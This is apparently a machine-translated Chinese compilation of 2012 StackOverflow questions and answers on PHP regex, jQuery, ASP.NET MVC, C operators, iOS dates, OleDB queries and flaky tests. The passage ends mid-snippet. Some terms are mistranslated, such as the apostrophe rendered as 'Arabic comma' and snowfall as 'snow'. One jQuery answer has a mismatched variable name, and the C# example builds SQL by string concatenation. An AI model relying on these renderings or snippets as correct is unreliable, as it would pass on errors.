# StackOverflow 问答 12624000-12624999

# php - 仅在链接中替换模式

> ID：12624001
> 
> 赞同：0
> 
> 时间：2012-09-27T14:42:04.950
> 
> 标签：php, regex, html-parsing, preg-replace, w3c-validation

我有一个这样的字符串：

```
Google is a <a href="http://hi.hi?xxx&yyy&zzz">web&amp;search engine</a>. 
```

根据 W3C 验证器的需要，我只想在链接`&`中替换：`&amp;`

```
Google is a <a href="http://hi.hi?xxx&amp;yyy&amp;zzz">web&amp;search engine</a>. 
```

你能为此建议一个正则表达式吗？谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T14:55:56.483

官方的正确答案是你不应该使用正则表达式来解析 HTML。相反，请查看 HTML 解析库。这个问题涵盖了您的选择：

[您如何在 PHP 中解析和处理 HTML/XML？](https://stackoverflow.com/questions/3577641/how-to-parse-and-process-html-with-php)

我建议采用这种方法。使用 DOM 之类的工具解析 HTML 后，您可以使用简单的正则表达式在链接中执行替换。如果您遇到困难，人们会很乐意提供帮助。

如果您确实坚持为此使用正则表达式（并且在 HTML 内容受您控制的某些有限情况下也可以），只需搜索此站点，您会发现大量问题，人们会在其中展示如何执行此操作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T05:51:45.243

正如 dan1111 所指出的，正则表达式充其量只是一个脆弱的工具。下一个问题是，您需要可变长度的后视断言来获得某种程度的可靠性，这让我感觉很舒服。

也就是说，很可能以下内容对您来说足够好 - 尝试使用您之前备份的一些数据：

```
$result = preg_replace('/&(?=[^<>]*>)/', '&amp;', $subject); 
```

`&`仅当下一个尖括号是闭合尖括号时才替换 an 。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T15:01:05.427

您可以使用前瞻和后瞻。

```
&(?<=\<a\s(href).*)(?=.*\"\>) 
```

它的作用是查找所有`&`前面的`< href`和任何字符，以及后面跟着一个`">`和的任何字符。当我在[RegexHero](http://regexhero.net/tester/)上进行测试时，它只选择`&`了链接本身。

# jquery - 获取触发div onchange的元素

> ID：12624002
> 
> 赞同：0
> 
> 时间：2012-09-27T14:42:05.610
> 
> 标签：jquery

假设我们有以下 div：

```
<div id="section">
    <input type="text" id="lastname" />
    <input type="text" id="firstname" />
    <input type="text" id="address" />
</div> 
```

我们有以下javascript代码：

```
$("#section").on('change', function() {
    //get element that its value changed - code to write here
}); 
```

如果我们更改这些输入字段之一中的值，jQuery 将触发更改事件。

1.  是否可以获得触发div上的事件的元素？

2.  如果没有，是否有任何替代方法可以识别哪个元素触发更改事件，而无需为每个元素编写 javascript 代码？因为在一个包含许多元素的形式中会很不方便。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T14:43:21.200

尝试这个

**[现场演示](http://jsbin.com/okabej/1/edit)**

```
$("#section").on('change', "input", function(event) {
    alert(evt.target.id);
    //get element that its value changed - code to write here
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T14:47:58.800

***这个***怎么样（如果你能原谅双关语）？

```
$("#section").on('change',"input",function(){
    var something = this; //this should refer to your element.
}); 
```

# asp.net-mvc - MVC - 覆盖 @Html.DropDownListFor()

> ID：12624004
> 
> 赞同：0
> 
> 时间：2012-09-27T14:42:09.283
> 
> 标签：asp.net-mvc

使用 MVC，我通常会做很多自定义显示/编辑器模板，这些模板非常适合自定义创建的模型类。

但是，由于如何设置下拉菜单样式（选择元素）的限制，我创建了一些样式，将一组不同的元素输出到标准。

有谁知道如何正确覆盖 @Html.DropDownListFor() 的输出，以便我的解决方案中的每个下拉菜单都会改变？网上有这方面的资源吗？

该方法本身可以在 System.Web.Mvc.dll 中找到，但需要一些资源用于指针/陷阱等。

谢谢，保罗。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:58:30.467

我已经开始这样做，并设法获得了一个非常粗糙/早期的版本，至少可以正常工作。它还不能处理所有的进进出出，但我会边做边做。

到目前为止，我所做的只是将下拉菜单包围在一个 div 中，这有助于增加样式。它还不适合命名它，或者添加 html 属性等

对于任何尝试这样做的人，到目前为止，我有以下内容，您可以根据自己的需要进行修改：

```
/// <summary>
/// Extension method for displaying a custom dropdownlist
/// </summary>
public static MvcHtmlString CustomDropDownListFor<TModel, TValue>(this HtmlHelper<TModel> html, Expression<Func<TModel, TValue>> expression, IEnumerable<SelectListItem> selectList, IDictionary<String, Object> htmlAttributes)
{
    StringBuilder ItemsStringBuilder = new StringBuilder();

    foreach (SelectListItem SingleListItem in selectList)
    {
            ItemsStringBuilder.AppendLine(DropDownExtensions.ListItemToOption(SingleListItem));
    }

    TagBuilder SelectTagBuilder = new TagBuilder("select")
    {
        InnerHtml = ItemsStringBuilder.ToString()
    };

    TagBuilder OuterTag = new TagBuilder("div")
    {
        InnerHtml = SelectTagBuilder.ToString()
    };

    OuterTag.Attributes.Add("class", "styled-select");

    return MvcHtmlString.Create(OuterTag.ToString(TagRenderMode.Normal));
} 
```

# jquery - jQuery - 不选择以“tinymce”开头的类

> ID：12624006
> 
> 赞同：0
> 
> 时间：2012-09-27T14:42:12.063
> 
> 标签：jquery, jquery-selectors

这段代码有什么问题：

```
$('input[maxlength],textarea[maxlength]').not("[class^='tinymce']").each(function() { 
```

我正在尝试选择：

*   所有`<textarea>`s 都带有`attr` `maxlength`
*   没有以“ *tinymce* ”开头的类名

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T14:45:01.960

这段代码对我有用...

[http://jsfiddle.net/xJCCT/1/](http://jsfiddle.net/xJCCT/1/)

只输出一个“你好”。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T14:48:22.623

它必须以类开头`tinymce`还是只包含类`tinymce`？

```
​$('input,textarea').filter(function(){
    return(!$(this).hasClass('tinymce'));
}).filter(function(){
    return($(this).attr(​​​​​​​​​​​​'maxlength'));
}) 
```

[http://jsfiddle.net/Fqg5Y/1/](http://jsfiddle.net/Fqg5Y/1/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T14:58:12.527

[http://jsfiddle.net/z5Wsk/](http://jsfiddle.net/z5Wsk/)

此代码选择没有以“tinymce”开头的类的文本区域。

```
$('input[maxlength],textarea[maxlength]').filter(function() {
    if($(this).attr('class')) {
        return null == $(this).attr('class').match(/\btinymce[a-z0-9_\-]*\b/i);
    }
    return true;
}).each(function() {
    //your part
}); 
```

​示例：未选择带有的元素`class="another tinymceFOO"`（而接受的答案会选择它）。

# python - wx.NotificationMessage AttributeError：“模块”对象没有属性“NotificationMessage”

> ID：12624015
> 
> 赞同：1
> 
> 时间：2012-09-27T14:42:41.800
> 
> 标签：python, linux, wxpython

尝试使用 wxPython 的 NotificationMessage 类时出现此错误：

wx.NotificationMessage("", "Hello world!").Show() AttributeError: 'module' 对象没有属性 'NotificationMessage'

代码很简单：

```
#!/usr/bin/python

import wx

app = wx.App()

wx.NotificationMessage("", "Hello world!").Show()

app.MainLoop() 
```

我错过了什么？

这是在 Linux Mint 13、MATE 1.2 桌面环境、Python 2.7.3 上运行的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T16:58:29.703

NotificationMessage 是 wx 2.9 库的一部分，任何包管理器都没有将其作为标准安装。如果您想使用它，您需要从[http://www.wxpython.org/手动下载和安装](http://www.wxpython.org/)

# r - 在多个内核上运行不同的程序

> ID：12624016
> 
> 赞同：1
> 
> 时间：2012-09-27T14:42:45.527
> 
> 标签：r, snowfall

希望这是一个我忽略了答案的简单问题，但是在今天早上的搜索中，我一无所获。

我的计算机上有四个内核，并且希望在 R 中通过多个内核同时运行不同的程序（循环）。如果我打开四个 R 会话，它们会自动放置在不同的核心上，还是我需要想办法用降雪来做到这一点？

我之前已经成功使用降雪来运行相同的程序，但之前使用了不同的值。但是降雪会让我在不同的内核上运行完全不同的程序吗？我可以将每个模拟循环设置为不同的功能（即：func1、func2、func3、func4），然后让降雪将每个功能分配给不同的核心吗？

谢谢你的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T14:49:07.617

我不知道它在不同的操作系统上如何，但在 Windows 上你的操作系统会处理这个问题。因此，您可以根据需要打开任意数量的 R 会话，它们将分布在内核中（每个进程最多占用一个内核）。如果您打开的 R 会话多于 CPU，那么显然有些将无法使用完整的 CPU。

所以这里不需要使用降雪。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T14:46:12.423

回答这个问题最简单的方法是：

1.  创建四个函数，每个函数都需要一两分钟才能运行
2.  利用`snowfall`
3.  查看您的 CPU 处理器使用情况。

但是要回答您的问题，是的，它们将分布在内核中。

`parallel`使用R 2.15 附带的包可能更容易

# android - 应用程序类和对象状态

> ID：12624017
> 
> 赞同：3
> 
> 时间：2012-09-27T14:42:49.920
> 
> 标签：android

我一直在研究 Application 类和保持对象状态的方法，我在网上阅读了很多东西，包括 android 文档（生命周期、建议等），许多关于主题和其他东西仍然有一些疑问，我希望这部分对未来的发展非常清楚。我想这对于每个 android 开发人员来说都是一个常见的问题，所以我想知道关于它的经验（而不仅仅是文档）。所以我有一些问题：

1- Application 类可以从内存中删除或初始化为前台的应用程序？只是我有一个应用程序的子类，其中有一些保持状态的静态变量，我知道如果应用程序进入后台，它可以被杀死以获取内存然后重新启动，但是当它在前台时会发生吗？

2-如果操作系统可以随时擦除或初始化应用程序内存，那么通过数据库或文件保持对象状态的唯一可靠方法？（真的希望不是！！）

3-可以帮助解决此问题的任何其他提示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:12:18.000

根据我的经验，您对文档所说的内容过度反应和过度思考。大多数应用程序不需要也不应该扩展应用程序。

1- 只有在最极端的情况下，应用程序才会在前台被杀死。所以你现在应该忘记这部分，只关心你的应用程序本身。如果发生这种情况，用户将从头开始重新启动您的应用程序。

您应该通过覆盖 onSaveInstanceState(Bundle outState) 和 onRetainCustomNonConfigurationInstance() 并在 onCreate(Bundle savedInstances) 和 getLastNonConfigurationInstance() 上读取它们的值来保持活动生命周期（非应用）的 2 状态对象。那些用于活动的方法可能已被弃用，我知道有些是，阅读文档，他们会告诉你哪些是片段的替代品。使用片段。状态也可以通过意图/捆绑从活动传递到其他活动。

3-要保持持久数据，您应该使用数据库和 SharedPreferences，活动状态使用可用的活动和片段回调。如果不知何故，您的应用程序有一些相当特殊的需求，您可以创建一个单例，但请相信我，99% 的应用程序不需要。

希望它有所帮助！

# autotools - Automake 可以同时包含多个 Makefile.am 吗？

> ID：12624021
> 
> 赞同：0
> 
> 时间：2012-09-27T14:42:59.390
> 
> 标签：autotools, automake

我有一组不同的项目，它们都共享一组通用的 C++ 库。目前这些通用库被复制到每个代码库中，但这对我来说是一个主要问题。我们使用 subversion 进行版本控制，所以我计划将公共库更改为一组 svn 外部。

一旦我这样做了，尽管我需要一种方法来制作父/子 Makefile.am 或某种方法来自动将 Makefile.ams 合并在一起。这可能吗？我知道 SUBDIR 功能，但是我试图避免递归生成。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-29T10:50:04.943

我将假设您在这里使用静态库，因为它使事情变得更简单。

您的公共库看起来有自己的`configure.ac`and `Makefile.am`，并且可能在`noinst_LIBRARIES`.

您使用该库的项目将通过 svn external 导入您的公共库，如下所示：

```
foo/
foo/configure.ac
foo/Makefile.am
foo/...
foo/libcommon/
foo/libcommon/configure.ac
foo/libcommon/Makefile.am
foo/libcommon/... 
```

在 foo's`configure.ac`中，添加对`AC_CONFIG_SUBDIRS([libcommon])`. 在 foo's`Makefile.am`中，添加`SUBDIRS = libcommon`. 除了这一层之外， foo 和 libcommon 都可以是非递归的。在 foo's`Makefile.am`中，您将添加类似`LDADD = libcommon/libcommon.a`. 您可能还需要添加类似`AM_CPPFLAGS = -I$(srcdir)/libcommon/include`.

然后，当你配置 foo 时，它会配置 libcommon 并构建它。该库被声明为 noinst 的事实意味着它只会静态链接到事物中，而不会安装在文件系统中。

# genetic-algorithm - 遗传算法交叉

> ID：12624022
> 
> 赞同：1
> 
> 时间：2012-09-27T14:43:00.733
> 
> 标签：genetic-algorithm

因此，如果我使用以下方法在遗传算法中实现交叉：

```
Input: Two strings of n bits x and y
Output: Two strings of n bits x' and y' 
```

并像这样应用交叉运算符：

随机选择一个交叉站点（以相等的概率），将每个字符串分成两个非零长度的子字符串：

```
x = [x1, x2];
y = [y1, y2] 
```

和：

```
x1.length = y1.length 
```

输出生成为：

```
x' = [x1, y2]
y' = [y1, x2] 
```

鉴于您从

```
(x1, y1) = ((1 0 1 0) (1 1 1 1)) 
```

指定哪些`4 bit strings`是仅通过交叉获得的可能值。

那么这是对的吗？

```
0 1 0 1 
```

我认为将它们加在一起是正确的，但我对此有点迷茫。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T11:37:49.370

将它们加在一起是错误的。

基因组长度为 4 意味着存在 3 个可能的[交叉](http://en.wikipedia.org/wiki/Crossover_%28genetic_algorithm%29)点（非零长度）。这些位于 4 位中的每一位之间。

如果选择交叉点 2，输入：

( **1010** ) ( *1111* ) -- x & y --

你得到的字符串是：

( **10** . *11* ) -- x 的前 2 个和 y 的后 2 个。

( *11* . **10** ) -- y 的前 2 个和 x 的后 2 个。

因此很容易找出其他 2 个排列（交叉点 1 和 3）。

我怀疑这是家庭作业，所以我不会为你做这一切:)

# entity-framework - 回复：UnitOfWork - 上下文可以解耦吗？

> ID：12624023
> 
> 赞同：0
> 
> 时间：2012-09-27T14:43:03.453
> 
> 标签：entity-framework, design-patterns, repository-pattern, unit-of-work

我刚刚看完了 Julie Lerman 关于 Enterprise EF 的视频。我特别喜欢自定义数据上下文的概念，因为它可以让我更精细地控制各个 UI。

Julie 在她的所有存储库中都有 CRUD 方法，这对我来说实在是太多了。我计划创建一个其他存储库从中派生的通用存储库。我不喜欢她的UOW。

我计划将这种方法用于 UOW，因为它与存储库有关：

[https://codereview.stackexchange.com/questions/14226/generic-repository-and-unit-of-work-code](https://codereview.stackexchange.com/questions/14226/generic-repository-and-unit-of-work-code)

**与自定义数据上下文对象的相对条件：**

1.  假设我创建：

    一世。仅具有完整 Customer 类的部分属性的 CustomerLookup 类。

2.  我也创作

    一世。CustomerLookup 数据库上下文

    ii. 具有完整 Orders 类但忽略配置中关联实体 Shipping 的 OrdersLookup 数据库上下文。

如果我按照上面链接中的 UOW 示例，UOW 使用**FULL DbContext**来保存更改。

**问题：**

1.  是否可以实例化 UOW，例如在 API 控制器中，以便可以使用特定的数据上下文：

    一世。CustomerLookupContext 与 UOW.CustomerLookupRepository.Update(customerLookup)？

    ii. OrdersLookupContext 与 UOW.OrdersLookupRepository.Update(order) ？

如果我无法将上下文对象与 UOW 分离：

1.  像上面那样更新部分类会不会有问题？或者
2.  使用整个 DbContext 会影响性能吗？或者，
3.  我不知道我在说什么 & 只是使用 UOW 的完整 DbContext？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T17:48:42.197

一个应用程序中应该只有一个 dbcontext。也有例外，例如当您需要访问两个不同的数据库时，但即便如此，我还是更喜欢使用 SQL Server Synonyms 将它们映射到单个数据库中。

在应用程序中放置多个上下文存在非常实际的问题。你会得到很多编译器错误并且必须处理命名空间冲突。可以解决它，但这是一个很大的痛苦。

为不同的用途制作不同的上下文没有任何好处。dbcontext 的全部意义在于您可以拥有对数据库的完全访问权限，在不同的实体中进行更改，然后在一次操作中保存所有更改。

你认为你得到了什么？它不像将整个数据库加载到内存中。

# c - 请解释此代码中运算符的关联性

> ID：12624024
> 
> 赞同：1
> 
> 时间：2012-09-27T14:43:03.580
> 
> 标签：c, associativity

```
#include <stdio.h>
int main(void)
{
  char s[] = {'a','b','c','\n','c','\0'};
  char *p;
  p=&s[3];
  printf("%d\t",++*p++);
  printf("%d",*p);
  return 0;
} 
```

输出：11 99
请解释输出。为什么地址有增量？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T14:45:34.550

我看到的唯一可能令人困惑的是

```
++*p++ 
```

Postincrement 比解引用运算符具有更高的优先级，因此完全用括号括起来它看起来像

```
++(*(p++)) 
```

哪个 postincrements`p`取消引用 的原始值`p`以获得 a `char`，然后预先增加 的值`char`，然后将新值打印`printf`为整数。

所以两者`p`和`p`指向的东西都会增加。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-27T14:48:56.310

您应该查看运算符的优先级。
该表达式由编译器`++*p++`评估`((*p) + 1)`，并且它还有一个副作用：它增加`*p`and的值`p`。使用 ASCII 兼容的字符集，该指令在标准输出上打印`11`( )。`'\n'+1 == 10+1 == 11`第二次`printf`调用打印`s[4]`( `'c'`) 的值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-27T14:49:49.110

C中的指针只是表示内存位置的整数。C 中的数组总是在连续的内存块中。因此，当您有一个指向数组的第三个元素的指针，并从指针中添加 1 时，它指向第四个元素。

如果您对以下内容感到困惑`++*p++`：那是因为 pre-increment`(++p)`和 post-increment之间的不同`(p++)`。对于讨厌 C++ 的人来说，有一个简单的绰号：

> “C++ - 改变语言，回归老问题”。

# ios - NSDate 但没有 NSTime ，如何转换时间的字符串表示形式（无日期）

> ID：12624025
> 
> 赞同：4
> 
> 时间：2012-09-27T14:43:06.740
> 
> 标签：ios, nsdate, nsdateformatter, nstimeinterval

我的问题是我想用某种方式来表示时间（没有日期），比如我的 iOS 应用程序中的时间。从 REST api 我得到像“13:12:11”这样的字符串，它显示了某事发生的时间，我曾经`NSDateFormatter`将 NSStrings 转换为 NSDates，但据我所知，它不接受只有时间组件的日期格式，如`HH:mm:ss`[编辑: 你可以，见下文]

所以我的问题是 1- NSTimeInterval（而不是 NSDate）是我应该用来存储时间的吗？
2-如何将“03:04:05”从内置框架之一转换为objective-c对象。

**编辑：**您可以使用像“HH：mm：ss”这样的格式，它只是用 2000-01-01 替换日期部分，但是拥有一个独立于日期的时间表示会非常好。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-27T15:20:09.823

好的，谢谢大家，这就是我最终做的事情：

```
NSString * timeAsString = "12:26:07";
NSDateFormatter * dateFormatter = [[NSDateFormatter alloc] init];
[dateFormatter setDateFormat:@"HH:mm:ss"];
NSDate * dateZero = [dateFormatter dateFromString:@"00:00:00"];
NSDate * dc = [dateFormatter dateFromString:timeAsString];
NSTimeInterval startTime = [dc timeIntervalSinceDate:dateZero]; 
```

这不是一个优雅的解决方案，但它可以工作，至少对于我需要做的事情，

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-27T14:57:56.487

您可以使用[NSDateComponent](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDateComponents_Class/Reference/Reference.html)根据时间创建日期。您可以根据当前日期或未来/过去日期向年份添加值。

```
NSDateComponents *component=[[NSDateComponents  alloc] init];
[component setHour:yourHour];
[component setMinute:yourMinutes];
[component setYear:yourYear];
[component setMonth:yourMonth];
[component setDay:yourDaty];
NSCalendar *calendar=[NSCalendar currentCalendar];
NSDate *date=[calendar dateFromComponents:component]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-06-23T20:16:09.713

NSDate *myDateVariable;

```
NSDateFormatter *dateFormatter = [[[NSDateFormatter alloc] init] autorelease];
[dateFormatter setDateStyle:NSDateFormatterMediumStyle];
[dateFormatter setTimeStyle:NSDateFormatterNoStyle];    //Not shown
[someDateLabel setText:[dateFormatter stringFromDate:[myDateVariable]]];

//OR FOR BESPOKE FORMATTING
NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
[dateFormatter setDateFormat:@"'Due' EEEE d MMM yyyy, h:mm a"];
[someDateLabel setText:[dateFormatter stringFromDate:[myDateVariable]]];

//Time using users 24/12 hour preference:
[dateFormatter setDateFormat:@"HH:mm"];

//Time using 12 hour AM/PM format:
[dateFormatter setDateFormat:@"h:mm a"];

//Day and date using abbreviated words:
[dateFormatter setDateFormat:@"' ('EEE d MMM yyyy')'"];

//Day and date using full words:
[dateFormatter setDateFormat:@"' ('EEEE d MMMM yyyy')'"]; 
```

# java - 如何制作一个按钮来停止执行的动作

> ID：12624026
> 
> 赞同：-4
> 
> 时间：2012-09-27T14:43:09.297
> 
> 标签：java

我制作了一个按钮来启动正在收听服务器语音的操作，那么如何使用“停止收听”按钮制作一个按钮来停止收听服务器？

```
private void CallActionPerformed(java.awt.event.ActionEvent evt) {                                       
       voiceReceiver tx1 = new voiceReceiver();
       tx1.captureAudio();

       System.out.println("voiceReceiver is calling >>>>");

       serVoice.setEnabled(false);
       Call.setEnabled(false);
       jButton3.setEnabled(true);
 } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T14:50:34.133

将语音接收器存储在一个字段中，并在单击“停止收听”按钮时停止它：

```
private void callActionPerformed(ActionEvent evt) {                                       
    this.voiceReceiver = new VoiceReceiver();
    this.voiceReceiver.captureAudio();

    System.out.println("voiceReceiver is calling >>>>");

    serVoice.setEnabled(false);
    call.setEnabled(false);
    jButton3.setEnabled(true);
}   

private void stopListeningActionPerformed(ActionEvent e) {
    this.voiceReceiver.stopCapturingAudio();
    ...
} 
```

请注意，我修正了您的命名。在 Java 中，按照惯例，方法以小写字母开头，类以大写字母开头。

# c# - 使用二进制列作为比较标准

> ID：12624028
> 
> 赞同：5
> 
> 时间：2012-09-27T14:43:19.610
> 
> 标签：c#, sql, ms-access, ado.net, oledb

我正在尝试使用 C# 中的 OleDB 更新 MS Access DB (*.mdb) 中的值。没什么特别的，只是我需要通过二进制值 a 来选择行`VARBINARY(4)`。

我天真地以为`UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE=01020304;`会奏效。但不是。替代尝试是：

```
UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE='01020304';
UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE='0x01020304';
UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE=0x01020304;
UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE=CAST('01020304' as VARBINARY);
UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE=CAST(01020304 as VARBINARY);
UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE=CAST('01020304' as VARBINARY(4));
UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE=CAST(01020304 as VARBINARY(4));
UPDATE MYTABLE SET VALUE= 'new' WHERE BINVALUE=CONVERT(varbinary(4),'01020304');
UPDATE MYTABLE SET VALUE= 'new' WHERE CAST(BINVALUE as VARCHAR(MAX)) = CAST('01020304' as VARCHAR(MAX));
UPDATE MYTABLE SET VALUE= 'new' WHERE CAST(BINVALUE as VARCHAR(MAX)) = CAST(01020304 as VARCHAR(MAX));
UPDATE MYTABLE SET VALUE= 'new' WHERE CONVERT(VARCHAR(MAX), BINVALUE) = CONVERT(VARCHAR(MAX), '01020304'); 
```

在 a 中使用`CAST`结果`syntax error exception: missing operator`。

`CONVERT`在异常中使用结果：`Undefined function 'CONVERT' in expression.`

中的受影响行数`int result`始终为零。使用`UPDATE MYTABLE SET VALUE= 'new' WHERE VALUE= old;`有效，但有时会击中不止一排。

在尝试并未能找到规避检查的方法时，`BINVALUE`我注意到您不应该在 WHERE 子句中的值周围使用阿拉伯逗号 (')。`UPDATE MYTABLE SET VALUE= 'new' WHERE VALUE='old';`工作时不工作`UPDATE MYTABLE SET VALUE= 'new' WHERE VALUE=old;`。

使用 MS Query 会产生关于阿拉伯逗号的不同结果：

`UPDATE MYTABLE SET VALUE='new' WHERE BINVALUE='01020304'`执行，但没有效果。

`UPDATE MYTABLE SET VALUE='new' WHERE BINVALUE=01020304`导致错误消息“查询表达式'BINVALUE = 01020304'中的数字语法错误。”

我无法重现错误消息“无法在条件中使用列 BINVALUE”。我在评论中提到的。

使用其他列来标识所需的行不起作用，因为大多数值是相同的。奇怪的`BINVALUE`是用作主键。

最重要的是，我不允许更改数据库架构，因为遗留应用程序正是需要它。

根据 gloomy.penguin 的输入，我认为 WHERE 子句中的类型转换/匹配存在问题。这导致了如何在 OleDB 或 Access 中完成转换/转换的问题，因为 CAST 运算符似乎是已知的，但 CONVERT 不是。我的猜测是，无论出于何种原因，CAST 的语法都不同于标准 SQL。

有什么建议，如何使这个更新查询起作用？

这是我精简的示例代码：

```
static String ToHexString(Byte[] buffer)
{
    String str;
    str = BitConverter.ToString(buffer).Replace("-", string.Empty);
    return (str);
}

...

String table = "MYTABLE";
String newvalue = "new";
Byte[] binvalue = { 1, 2, 3, 4 };

String providerStr= @"Provider=Microsoft.JET.OLEDB.4.0;" + @"data source=C:\myDB.mdb";
connection = new OleDbConnection(providerStr);
connection.Open();

String cmd = @"UPDATE " + table + " SET VALUE= '" + newvalue + "'"
    + " WHERE BINVALUE= '" + ToHexString(binvalue) + "'"
    + ";";

OleDbCommand command = new OleDbCommand(cmd, connection);
int result = command.ExecuteNonQuery();

connection.Close(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-02T10:42:59.887

我想出了一种方法来解决我一直面临的类型转换问题。显然不可能使用 SQL 语法，而是使用带参数的命令。

代替：

```
String cmd = @"UPDATE " + table + " SET VALUE= '" + newvalue + "'"
    + " WHERE BINVALUE= '" + ToHexString(binvalue) + "'"
    + ";";

OleDbCommand command = new OleDbCommand(cmd, connection);
int result = command.ExecuteNonQuery(); 
```

我不得不使用：

```
String cmd = @"UPDATE " + table + " SET VALUE= '" + newvalue + "'"
    + " WHERE BINVALUE= @binval" + ";";

OleDbCommand command = new OleDbCommand(cmd, connection);

OleDbParameter param = new OleDbParameter();
param.OleDbType = OleDbType.Binary;
param.ParameterName = "binval";
param.Value = binvalue;
command.Parameters.Add(param);

int result = command.ExecuteNonQuery(); 
```

当然，以这种方式添加所有参数会更干净。我省略了这一点以突出重要部分。

[如需进一步阅读，请参阅C# 助手博客](http://blog.csharphelper.com/2012/07/06/save-an-image-in-an-access-database-in-c.aspx)上的如何将图像作为二进制数据读取和写入数据库的示例。

# unit-testing - 单元测试有时失败，有时通过

> ID：12624030
> 
> 赞同：15
> 
> 时间：2012-09-27T14:43:22.937
> 
> 标签：unit-testing, jenkins, mocha.js

我有一个 mocha 单元测试套件。

当我在本地运行它们时，一切正常。当我在我们的 Jenkins CI 服务器上运行它们时，它们有时会失败，有时会通过。

我只是无法重现他们失败的原因。什么可能导致这种行为？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-29T01:21:02.220

由于多种原因，测试可能会间歇性地失败，确定它们失败的原因通常会揭示您的代码库和环境。

以下是一些可能的原因：

• 共享对象——如果测试环境未重置为众所周知的状态，则保持状态的单例可能会导致测试之间出现问题。如果您的测试运行程序以不确定的顺序执行测试，您可能会看到随机错误，这些错误实际上暴露了损坏的状态问题

• 环境和外部依赖——任何可以保持状态的外部对象都可能导致不可预知的结果

• 时间——有时测试是用太具体的超时或线程休眠来编写的。如果构建服务器在重负载下运行，这些超时可能不够长

作为一般指导，测试必须：

*   孤立的：测试一次只关注一个单元
*   可重复的：每次产生相同的结果
*   独立：执行测试的顺序无关紧要

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-30T13:50:15.227

我会尝试通过将执行程序的数量减少到 1 来缩小问题的范围。如果测试仍然间歇性地失败，那么你有一个[Test Run War](http://xunitpatterns.com/Erratic%20Test.html#Test%20Run%20War)，否则（假设它们在本地运行良好）它看起来像一个[Resource Leakage](http://xunitpatterns.com/Erratic%20Test.html#Resource%20Leakage)。

更多信息请访问[http://xunitpatterns.com/Erratic%20Test.html](http://xunitpatterns.com/Erratic%20Test.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-27T15:11:06.707

我猜你正在重用测试夹具进行多个测试。在某些情况下，测试的顺序与本地计算机上的顺序不同，并且在开始测试时您没有正确的夹具。要修复它，您应该给每个测试一个干净的夹具。

另一个原因可能是您在运行测试时重用了多个位置的数据库（两个构建服务器具有相同的测试配置）。为每个构建服务器提供自己的数据库。或子/模拟您的数据库层。您的测试不应依赖于外部资源，除非您正在测试与外部资源的连接。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2017-05-25T08:01:41.287

如果您正在测试多线程代码并`Thread.sleep(time);`在测试中使用，则可能会发生这种情况。如果睡眠时间不够长，测试可能会通过或失败，具体取决于计算机的处理速度。相关讨论：

*   [如何编写 JUnit 测试用例来测试线程和事件](https://stackoverflow.com/questions/5336251/how-do-i-write-a-junit-test-case-to-test-threads-and-events)
*   [单元测试多线程应用程序](https://stackoverflow.com/questions/3914822/unit-testing-multithreaded-applications/3914948#3914948)
*   [我应该如何对线程代码进行单元测试？](https://stackoverflow.com/questions/12159/how-should-i-unit-test-threaded-code?rq=1)
*   [JUnit 测试用例中的 Thread.sleep](https://stackoverflow.com/questions/28695437/thread-sleep-in-junit-test-case)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2022-03-04T19:30:49.540

我正在与`jest`. 我的问题是模拟数据导致测试间歇性失败。清除模拟并在每个内部使用假计时器`describe`有助于解决我的问题：

```
describe("my test", ()=> {

    beforeAll(() => {
        jest.setTimeout(30000);
        jest.useFakeTimers();
      });
    afterAll(() => {
        jest.useRealTimers();
      });
    beforeEach(() => {
        jest.clearAllMocks();
      });

    it("my test", async()=>{....})

    ...

}) 
```

# javascript - jQuery find 使用函数作为参数

> ID：12624037
> 
> 赞同：1
> 
> 时间：2012-09-27T14:43:53.743
> 
> 标签：javascript, jquery, find, traversal

我一直错过 jQuery 中的一个遍历函数，我想可能有一个但我错过了。假设我们有以下标记：

```
<ul>
    <li><a href="#">Foo</a></li>
    <li><a href="#">Bar</a></li>
    <li><a href="#">John</a></li>
    <li><a href="#">Doe</a></li>
</ul> 
```

现在，如果我想向我单击的锚点添加一个活动类并停用其他类，我通常必须这样做：

```
$('a').click(function() {
    $(this).addClass('active')
        .parent()
        .siblings()
        .find('a.active')
